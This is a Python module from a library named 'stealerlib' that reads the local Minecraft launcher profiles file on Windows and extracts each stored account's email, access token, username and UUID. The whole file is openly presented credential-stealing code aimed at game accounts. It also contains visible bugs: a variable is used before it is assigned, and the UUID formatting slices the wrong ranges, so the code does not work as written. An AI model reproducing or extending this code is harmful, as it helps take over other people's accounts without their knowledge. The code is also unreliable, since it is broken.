#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/apps/minecraft/__init__.py
"""

import os
import json

from typing import Union, Optional

from stealerlib.exceptions import *

from stealerlib.apps.minecraft.types import MinecraftTypes


class Minecraft:
    """This class provides methods for extracting and decrypting information from the local Minecraft database

    Attributes:
        accounts    A list of connected minecraft accounts stored in a list of values or a StealerLib object
        database    The local Minecraft database (of accounts) that we're reading from
    """

    def __init__(self):
        self.accounts = []
        self.database = self.__load__()

    @catch
    @staticmethod
    def __load__() -> dict:
        """'Loads' the Minecraft launcher profiles database if the path is available

        Raises:
            NoDatabaseFoundError: If there is an exception raised in the process of loading the database

        Returns:
            dict: The general 'authentication' section of the launcher_profiles database
        """

        profiles_path = f"{os.getenv('APPDATA')}\\.minecraft\\launcher_profiles.json"
        try:
            general_database = json.loads(open(profiles_path).read())

            return general_database["authenticationDatabase"]
        except:
            raise NoDatabaseFoundError("Couldn't open the Minecraft Launcher Profiles' Database")

    @catch
    def get_accounts(
        self,
        conv: Optional[bool]=True
    ) -> list[Union[list, MinecraftTypes.Account]]:
        if self.database:
            replace_username = lambda u : u.replace("_", "\\_")

            for row in self.database:
                column = self.database[row]
                items = column["profiles"].items()

                email = column["username"]
                token = column["accessToken"]
                username = name_object["displayName"]
                uuid, name_object = list(items)[0]

                obj_accounts = MinecraftTypes.Account(
                    email=email,
                    username=replace_username(username),
                    uuid=self.convert_uuid(uuid),
                    token=token,
                )

                self.accounts.append(
                    obj_accounts.conv() if conv else obj_accounts
                )

        return self.accounts

    @staticmethod
    def convert_uuid(uuid: str) -> str:
        return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
